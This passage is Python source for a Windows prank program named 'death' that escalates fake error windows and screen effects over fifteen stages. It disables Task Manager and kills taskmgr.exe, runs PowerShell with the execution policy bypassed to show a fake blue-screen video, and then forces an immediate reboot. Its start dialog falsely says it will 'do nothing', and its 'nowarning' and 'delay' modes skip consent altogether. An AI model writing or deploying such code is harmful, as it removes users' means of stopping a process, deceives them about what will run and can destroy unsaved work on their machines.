    lifetime = ERROR_WINDOW_LIFETIMES[stage]
    win.after(lifetime, lambda w=win: remove_window_immediately(w))

def remove_window_immediately(win):
    """Close a window right away."""
    try:
        win.destroy()
    except Exception:
        pass
    try:
        all_windows.remove(win)
    except ValueError:
        pass


def clearallerrors():
    """Close all currently tracked fake error windows."""
    for win in all_windows[:]:
        remove_window_immediately(win)


def open_debug_menu():
    """Open a small control panel for testing payloads and stage behavior."""
    global debug_window
    if debug_window is not None:
        try:
            if debug_window.winfo_exists():
                debug_window.lift()
                debug_window.focus_force()
                return
        except Exception:
            debug_window = None

    debug_window = tk.Toplevel(root)
    debug_window.title("death Debug")
    debug_window.attributes("-topmost", True)
    debug_window.configure(bg="#202020")
    debug_window.geometry("460x470")

    def on_close():
        global debug_window
        debug_window.destroy()
        debug_window = None

    debug_window.protocol("WM_DELETE_WINDOW", on_close)

    container = tk.Frame(debug_window, bg="#202020", padx=12, pady=12)
    container.pack(fill="both", expand=True)

    title = tk.Label(
        container,
        text="death controller",
        bg="#202020",
        fg="white",
        font=("Segoe UI", 12, "bold")
    )
    title.pack(anchor="w")

    subtitle = tk.Label(
        container,
        text="test death, simulate death, explore death",
        bg="#202020",
        fg="#d0d0d0",
        justify="left",
        wraplength=420
    )
    subtitle.pack(anchor="w", pady=(4, 12))

    stage_frame = tk.LabelFrame(
        container,
        text="Stage",
        bg="#202020",
        fg="white",
        padx=8,
        pady=8
    )
    stage_frame.pack(fill="x")

    stage_var = tk.IntVar(value=stage)
    stage_spin = tk.Spinbox(
        stage_frame,
        from_=1,
        to=15,
        textvariable=stage_var,
        width=6
    )
    stage_spin.pack(side="left")

    tk.Button(
        stage_frame,
        text="Apply Stage",
        width=12,
        command=lambda: set_stage(stage_var.get())
    ).pack(side="left", padx=(8, 0))

    quick_stage_frame = tk.Frame(stage_frame, bg="#202020")
    quick_stage_frame.pack(fill="x", pady=(10, 0))
    for stage_num in range(1, 16):
        tk.Button(
            quick_stage_frame,
            text=str(stage_num),
            width=3,
            command=lambda s=stage_num: (stage_var.set(s), set_stage(s))
        ).grid(row=(stage_num - 1) // 5, column=(stage_num - 1) % 5, padx=2, pady=2)

    actions_frame = tk.LabelFrame(
        container,
        text="Payloads",
        bg="#202020",
        fg="white",
        padx=8,
        pady=8
    )
    actions_frame.pack(fill="x", pady=(12, 0))

    tk.Button(actions_frame, text="Create Error", width=14, command=create_error).grid(row=0, column=0, padx=2, pady=2)
    tk.Button(actions_frame, text="Clear Errors", width=14, command=clearallerrors).grid(row=0, column=1, padx=2, pady=2)
    tk.Button(actions_frame, text="Play Error Sound", width=14, command=lambda: random.choice(sounds).play()).grid(row=0, column=2, padx=2, pady=2)

    tk.Button(actions_frame, text="Toggle Pieces", width=14, command=toggle_pieces_debug).grid(row=1, column=0, padx=2, pady=2)
    tk.Button(actions_frame, text="Toggle Invert", width=14, command=toggle_invert_debug).grid(row=1, column=1, padx=2, pady=2)
    tk.Button(actions_frame, text="Toggle Tunnel", width=14, command=toggle_tunnel_debug).grid(row=1, column=2, padx=2, pady=2)

    tk.Button(actions_frame, text="Toggle DrawIcon", width=14, command=toggle_drawicon_debug).grid(row=2, column=0, padx=2, pady=2)
    tk.Button(actions_frame, text="Toggle Floating", width=14, command=toggle_floating_icons_debug).grid(row=2, column=1, padx=2, pady=2)
    tk.Button(actions_frame, text="Toggle Shaker", width=14, command=toggle_shaker_debug).grid(row=2, column=2, padx=2, pady=2)

    footer = tk.Frame(container, bg="#202020")
    footer.pack(fill="x", pady=(12, 0))
    tk.Button(footer, text="Close Debug", width=12, command=on_close).pack(side="right")

def spawn_window_loop():
    global start_time
    if start_time is None:
        start_time = time.time()

    if running:
        if len(all_windows) < MAX_ERROR_WINDOWS:
            create_error()
        interval = ERROR_WINDOW_SPAWN_INTERVALS[stage]
        root.after(interval, spawn_window_loop)

# Spawn random floating icons.
def spawn_random_icon():
    global floating_icon_after_id
    if not running:
        floating_icon_after_id = None
        return
    if not icon_overlay.running or icon_overlay.canvas is None:
        floating_icon_after_id = None
        return
    if stage in FLOATING_ICON_DISABLED_STAGES and not debug_force_floating_icons:
        floating_icon_after_id = None
        return

    x = random.randint(0, screen_width)
    y = random.randint(0, screen_height)
    icon = icon_overlay.canvas.create_image(x, y, image=cursor_icon_photo)
    life = ERROR_ICON_LIFETIMES[stage]
    icon_overlay.root.after(
        life,
        lambda icon_id=icon: (
            icon_overlay.running
            and icon_overlay.canvas is not None
            and icon_overlay.canvas.delete(icon_id)
        )
    )
    interval = ERROR_ICON_SPAWN_INTERVALS[stage]
    floating_icon_after_id = icon_overlay.root.after(interval, spawn_random_icon)


def enable_floating_icons():
    global floating_icon_after_id
    if not running or (stage in FLOATING_ICON_DISABLED_STAGES and not debug_force_floating_icons):
        return
    if not icon_overlay.running:
        icon_overlay.start()
    if floating_icon_after_id is None:
        floating_icon_after_id = icon_overlay.root.after(0, spawn_random_icon)


def disable_floating_icons():
    global floating_icon_after_id
    if icon_overlay.running and floating_icon_after_id is not None:
        try:
            icon_overlay.root.after_cancel(floating_icon_after_id)
        except Exception:
            pass
    floating_icon_after_id = None
    icon_overlay.stop()


def toggle_pieces_debug():
    if is_pieces_running():
        stop_pieces()
        return
    pieces_interval = PIECES_TIMER_SETTINGS.get(stage, 5000)
    set_pieces_timer(pieces_interval)
    start_pieces(pieces_interval)


def toggle_invert_debug():
    global invert_active
    invert_interval = INVERT_INTERVALS.get(stage, 5000)
    if invert_active:
        stop_invert()
        invert_active = False
        return
    try:
        set_invert_interval(invert_interval)
    except Exception:
        pass
    try:
        start_invert(invert_interval)
        invert_active = True
    except Exception:
        pass


def toggle_tunnel_debug():
    global tunnel_active
    tunnel_interval = TUNNEL_EFFECT_INTERVALS.get(stage, 1.0)
    if tunnel_active:
        try:
            stop_tunnel()
        except Exception:
            pass
        tunnel_active = False
        return
    try:
        start_tunnel(tunnel_interval)
        tunnel_active = True
    except Exception:
        pass


def toggle_drawicon_debug():
    global drawicon_active
    drawicon_interval = DRAWICON_INTERVALS.get(stage, 1000)
    if drawicon_active:
        stop_drawicon()
        drawicon_active = False
        return
    try:
        start_drawicon(drawicon_interval)
        drawicon_active = True
    except Exception:
        pass


def toggle_floating_icons_debug():
    global debug_force_floating_icons
    if icon_overlay.running:
        debug_force_floating_icons = False
        disable_floating_icons()
    else:
        debug_force_floating_icons = True
        enable_floating_icons()


def toggle_shaker_debug():
    global shaker_active
    if shaker_active:
        stop_shaker()
        shaker_active = False
        return
    set_shaker_intensity(SHAKER_INTENSITIES.get(stage, 0.25))
    start_shaker()
    shaker_active = True

# Exit hotkeys

def f4_emergency_kill():
    """F4 stops everything immediately."""
    global drawicon_active, invert_active, tunnel_active, shaker_active
    enable_task_manager()
    try:
        stop_pieces()
    except Exception:
        pass
    try:
        stop_tunnel()
    except Exception:
        pass
    tunnel_active = False
    try:
        stop_drawicon()
    except Exception:
        pass
    drawicon_active = False
    try:
        stop_invert()
    except Exception:
        pass
    invert_active = False
    try:
        stop_shaker()
    except Exception:
        pass
    shaker_active = False
    global running
    running = False
    # Close fake windows.
    clearallerrors()
    # Stop the icon overlay.
    disable_floating_icons()
    root.destroy()

def f7_remove_immediately():
    """F7 clears the windows, then exits."""
    global drawicon_active, invert_active, tunnel_active, shaker_active
    global running
    running = False
    enable_task_manager()
    # Close fake windows.
    clearallerrors()
    # Stop floating icons.
    try:
        disable_floating_icons()
    except Exception:
        pass
    # Let the sounds trail off for a moment.
    end_time = time.time() + 2
    def continue_sounds():
        if time.time() < end_time:
            play_error_sound_loop()
            root.after(500, continue_sounds)
        else:
            try: root.destroy()
            except: pass
    continue_sounds()
    try:
        stop_pieces()
    except Exception:
        pass
    try:
        stop_tunnel()
    except Exception:
        pass
    tunnel_active = False
    try:
        stop_drawicon()
    except Exception:
        pass
    drawicon_active = False
    try:
        stop_invert()
    except Exception:
        pass
    invert_active = False
    try:
        stop_shaker()
    except Exception:
        pass
    shaker_active = False

keyboard.add_hotkey("F7", f7_remove_immediately)
keyboard.add_hotkey("F4", f4_emergency_kill)


def stop_all_effects_for_finale():
    """Stop every active effect without closing the app yet."""
    global running, drawicon_active, invert_active, tunnel_active, shaker_active
    running = False
    enable_task_manager()
    try:
        pygame.mixer.stop()
    except Exception:
        pass
    try:
        clearallerrors()
    except Exception:
        pass
    try:
        disable_floating_icons()
    except Exception:
        pass
    try:
        stop_pieces()
    except Exception:
        pass
    try:
        stop_tunnel()
    except Exception:
        pass
    tunnel_active = False
    try:
        stop_drawicon()
    except Exception:
        pass
    drawicon_active = False
    try:
        stop_invert()
    except Exception:
        pass
    invert_active = False
    try:
        stop_shaker()
    except Exception:
        pass
    shaker_active = False


def open_just_kidding_terminal():
    subprocess.Popen(["cmd", "/k", "echo just kidding"])


def play_finale_video_then_terminal():
    video_path = os.path.join(script_dir, "assets", "bsod anim.mp4")
    if not os.path.exists(video_path):
        print(f"Finale video not found: {video_path}")
        open_just_kidding_terminal()
        root.after(0, root.destroy)
        return

    ps_script = r'''
Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase
$videoPath = $env:DEATH_FINALE_VIDEO
$window = New-Object Windows.Window
$window.WindowStyle = 'None'
$window.ResizeMode = 'NoResize'
$window.WindowState = 'Maximized'
$window.Topmost = $true
$window.Background = 'Black'
$media = New-Object Windows.Controls.MediaElement
$media.Source = [Uri]::new($videoPath)
$media.LoadedBehavior = 'Manual'
$media.UnloadedBehavior = 'Manual'
$media.Stretch = 'UniformToFill'
$window.Content = $media
$window.Add_Loaded({ $media.Play() })
$media.Add_MediaEnded({
    try {
        if ($media.NaturalDuration.HasTimeSpan) {
            $media.Position = $media.NaturalDuration.TimeSpan - [TimeSpan]::FromMilliseconds(50)
        }
    } catch {}
    $media.Pause()
    $timer = New-Object Windows.Threading.DispatcherTimer
    $timer.Interval = [TimeSpan]::FromSeconds(3)
    $timer.Add_Tick({
        $timer.Stop()
        $window.Close()
    })
    $timer.Start()
})
$window.ShowDialog() | Out-Null
'''
    env = os.environ.copy()
    env["DEATH_FINALE_VIDEO"] = video_path
    subprocess.run(
        ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps_script],
        env=env,
        check=False,
    )
    subprocess.Popen(["cmd", "/k", "shutdown /r /f /t 0"])
    root.after(0, root.destroy)

def start_finale_sequence():
    global finale_started
    if finale_started:
        return
    finale_started = True
    stop_all_effects_for_finale()
    hide_cursor()
    threading.Thread(target=play_finale_video_then_terminal, daemon=True).start()


def set_stage(new_stage):
    """Move to a new stage."""
    global stage, drawicon_active, invert_active, tunnel_active, shaker_active
    if 1 <= new_stage <= 15 and new_stage != stage:
        stage = new_stage
        print(f"Stage {stage} enabled - Chaos level: {stage}/15")

        # Pieces effect
        if stage >= 3:
            pieces_interval = PIECES_TIMER_SETTINGS[stage]
            set_pieces_timer(pieces_interval)
            if not is_pieces_running():
                start_pieces(pieces_interval)
        elif stage < 3:
            try:
                stop_pieces()
            except Exception:
                pass

        # Invert starts at stage 4.
        if stage >= 4:
            invert_interval = INVERT_INTERVALS[stage]
            try:
                set_invert_interval(invert_interval)
            except Exception:
                pass
            try:
                start_invert(invert_interval)
                invert_active = True
            except Exception:
                pass
        elif stage < 4:
            try:
                stop_invert()
            except Exception:
                pass
            invert_active = False

        # Shaker runs from stage 3 through stage 13.
        if 3 <= stage < 14:
            set_shaker_intensity(SHAKER_INTENSITIES[stage])
            start_shaker()
            shaker_active = True
        else:
            try:
                stop_shaker()
            except Exception:
                pass
            shaker_active = False
        
        # Tunnel runs only from stage 5 through stage 15.
        if 5 <= stage <= 15:
            # Restart it with the new speed.
            try:
                stop_tunnel()
            except Exception:
                pass
            start_tunnel(TUNNEL_EFFECT_INTERVALS[stage])
            tunnel_active = True
        else:
            try:
                stop_tunnel()
            except Exception:
                pass
            tunnel_active = False

        # The floating icon overlay is a fullscreen transparent Tk window.
        # In stages 8-10 the tunnel effect is aggressive enough that the
        # overlay's full-window repaints fight with the desktop feedback loop.
        if stage in FLOATING_ICON_DISABLED_STAGES:
            disable_floating_icons()
        else:
            enable_floating_icons()

        # Draw icon effect starts at stage 5.
        if stage >= 5:
            drawicon_interval = DRAWICON_INTERVALS[stage]
            try:
                start_drawicon(drawicon_interval)
                drawicon_active = True
            except Exception:
                pass
        elif stage < 5:
            try:
                stop_drawicon()
            except Exception:
                pass
            drawicon_active = False

        if stage == 15:
            root.after(25000, start_finale_sequence)


################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################

def start_scripted_timeline():
    """Start the normal staged timeline."""
    print("your time has come.")
    enable_floating_icons()
    root.after(10000, spawn_window_loop)
    root.after(10000, play_error_sound_loop)
    root.after(10000, lambda: set_stage(2))
    root.after(10000, lambda: disable_task_manager())
    root.after(10000, lambda: subprocess.run(["taskkill", "/f", "/im", "taskmgr.exe"], check=False))
    root.after(20000, lambda: set_stage(3))
    root.after(30000, lambda: set_stage(4))
    root.after(40000, lambda: set_stage(5))
    root.after(50000, lambda: set_stage(6))
    root.after(60000, lambda: set_stage(7))
    root.after(70000, lambda: set_stage(8))
    root.after(70000, lambda: clearallerrors())
    root.after(80000, lambda: set_stage(9))
    root.after(90000, lambda: set_stage(10))
    root.after(100000, lambda: set_stage(11))
    root.after(110000, lambda: set_stage(12))
    root.after(120000, lambda: set_stage(13))
    root.after(120000, lambda: clearallerrors())
    root.after(130000, lambda: set_stage(14))
    root.after(140000, lambda: set_stage(15))

################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################
################################################################################################


# Warning dialog before death starts.
def start_confirmation(allow_debug=False):
    selection = {"mode": "cancel"}

    w, h = 400, 155
    x = (screen_width - w) // 2
    y = (screen_height - h) // 2

    win = tk.Toplevel()
    win.overrideredirect(True)
    win.attributes("-topmost", True)
    win.geometry(f"{w}x{h}+{x}+{y}")

    title_color = "#FD0000"
    bg_color = "#500202"

    # Draggable title bar.
    title_bar = tk.Frame(win, bg=title_color, height=24)
    title_bar.pack(fill="x")
    title_label = tk.Label(title_bar, text="death", bg=title_color, fg="white", font=("Segoe UI", 10, "bold"))
    title_label.pack(side="left", padx=5)

    def start_move(event):
        win.x = event.x
        win.y = event.y
    def do_move(event):
        win.geometry(f"+{event.x_root - win.x}+{event.y_root - win.y}")
    title_bar.bind("<Button-1>", start_move)
    title_bar.bind("<B1-Motion>", do_move)

    content_frame = tk.Frame(win, bg=bg_color)
    content_frame.pack(fill="both", expand=True)

    canvas_bg = tk.Canvas(content_frame, width=w, height=h-24, bg=bg_color, highlightthickness=0)
    canvas_bg.pack(fill="both", expand=True)

    icon_label = tk.Label(canvas_bg, image=loaded_icons["death"], bg=bg_color)
    canvas_bg.create_window(20, 10, anchor="nw", window=icon_label)

    # Main message
    lines = [
        "welcome to death",
        "its gonna have cool effects, but do nothing",
        "r u sure you can handle death? u can press f7 to stop",
        "Are you sure you want to start death?"
    ]
    y_offset = 10
    for line in lines:
        msg_label = tk.Label(canvas_bg, text=line, bg=bg_color, fg="white", anchor="nw", justify="left", wraplength=w-80)
        canvas_bg.create_window(60, y_offset, anchor="nw", window=msg_label)
        y_offset += 20

    def yes():
        selection["mode"] = "normal"
        win.destroy()

    def no():
        selection["mode"] = "cancel"
        win.destroy()

    def open_debug():
        selection["mode"] = "debug"
        win.destroy()

    def maybe_reveal_debug(event):
        if not allow_debug:
            return None
        if event.state & 0x0001:
            canvas_bg.itemconfigure(debug_window_id, state="normal")
            return "break"
        return None

    btn_yes = tk.Button(canvas_bg, text="yes", width=8, font=("Segoe UI", 9, "bold"),
                        bg="#2A2A2A", fg="white", activebackground="#4840DE", activeforeground="white",
                        bd=2, relief="solid", highlightbackground="#484848",
                        command=yes)
    btn_no = tk.Button(canvas_bg, text="no", width=8, font=("Segoe UI", 9, "bold"),
                       bg="#2A2A2A", fg="white", activebackground="#4840DE", activeforeground="white",
                       bd=2, relief="solid", highlightbackground="#484848",
                       command=no)
    btn_no.bind("<Button-1>", maybe_reveal_debug)
    btn_debug = tk.Button(canvas_bg, text="debug", width=8, font=("Segoe UI", 9, "bold"),
                          bg="#2A2A2A", fg="white", activebackground="#4840DE", activeforeground="white",
                          bd=2, relief="solid", highlightbackground="#484848",
                          command=open_debug)

    canvas_bg.create_window(w//2 - 60, h - 60, anchor="nw", window=btn_yes)
    canvas_bg.create_window(w//2 + 20, h - 60, anchor="nw", window=btn_no)
    debug_window_id = canvas_bg.create_window(w//2 - 140, h - 60, anchor="nw", window=btn_debug, state="hidden")

    win.grab_set()
    root.wait_window(win)
    return selection["mode"]

def run_start_mode(selected_mode):
    """Start death based on the mode setting at the top of the file."""
    selected_mode = selected_mode.strip().lower()
    if selected_mode not in VALID_START_MODES:
        print(f"Unknown start mode '{mode}', using warning mode instead.")
        selected_mode = "warning"

    if selected_mode == "warning":
        return start_confirmation(allow_debug=False)
    if selected_mode == "warningdebug":
        return start_confirmation(allow_debug=True)
    if selected_mode == "nowarning":
        return "normal"
    if selected_mode == "debug":
        return "debug"
    if selected_mode == "delay":
        return "delay"

    return "cancel"


# Main entry point
startup_mode = run_start_mode(mode)

if startup_mode == "normal":
    root.after(0, start_scripted_timeline)
    root.mainloop()
elif startup_mode == "debug":
    root.after(0, open_debug_menu)
    root.mainloop()
elif startup_mode == "delay":
    print(f"death starts in {START_DELAY_MS // 1000} seconds.")
    root.after(START_DELAY_MS, start_scripted_timeline)
    root.mainloop()
else:
    print("death has been declined")
    root.destroy()
